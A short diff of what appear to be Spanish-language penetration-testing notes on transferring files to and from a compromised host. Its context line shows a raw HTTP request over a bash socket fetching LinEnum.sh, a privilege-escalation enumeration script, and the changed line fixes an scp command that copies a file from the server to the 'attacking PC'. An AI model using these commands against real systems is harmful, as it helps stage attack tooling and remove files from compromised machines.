@@ -23,5 +23,5 @@ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 
 
 si tenemos acceso por ssh a un servidor podemos mover archivos desde nuestra pc atacante con scp:
-scp user@ip:/path_to_file
+scp user@ip:/path_to_file . 
 
